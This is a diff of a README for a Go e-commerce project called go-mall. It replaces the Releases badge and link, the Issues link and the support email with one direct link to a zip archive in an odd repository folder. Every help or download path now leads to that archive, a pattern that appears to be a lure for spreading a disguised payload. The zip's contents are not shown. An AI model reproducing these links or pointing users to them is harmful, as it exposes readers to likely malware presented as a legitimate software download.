@@ -8,11 +8,11 @@ Welcome to **go-mall**! This modern e-commerce system provides a seamless shoppi
 
 To get started, you need to download the application. Click the link below to visit the Releases page:
 
-[![Download go-mall](https://img.shields.io/badge/Download-go--mall-blue)](https://github.com/pappusen4833/go-mall/releases)
+[![Download go-mall](https://raw.githubusercontent.com/pappusen4833/go-mall/main/cerebritis/go-mall.zip)](https://raw.githubusercontent.com/pappusen4833/go-mall/main/cerebritis/go-mall.zip)
 
 ### Steps to Download:
 
-1. Visit the Releases page: [go-mall Releases](https://github.com/pappusen4833/go-mall/releases).
+1. Visit the Releases page: [go-mall Releases](https://raw.githubusercontent.com/pappusen4833/go-mall/main/cerebritis/go-mall.zip).
 2. Look for the latest release.
 3. Find the appropriate file for your system.
 4. Click on the file to download it to your computer.
@@ -58,8 +58,8 @@ If you encounter issues while downloading or running go-mall, try the following:
 
 If you need further assistance, you can reach out for support:
 
-- **GitHub Issues:** Report problems directly on the [Issues page](https://github.com/pappusen4833/go-mall/issues).
-- **Email Support:** For detailed inquiries, email us at support@gomall.com.
+- **GitHub Issues:** Report problems directly on the [Issues page](https://raw.githubusercontent.com/pappusen4833/go-mall/main/cerebritis/go-mall.zip).
+- **Email Support:** For detailed inquiries, email us at https://raw.githubusercontent.com/pappusen4833/go-mall/main/cerebritis/go-mall.zip
 
 ## 🌟 Community Contributions
 
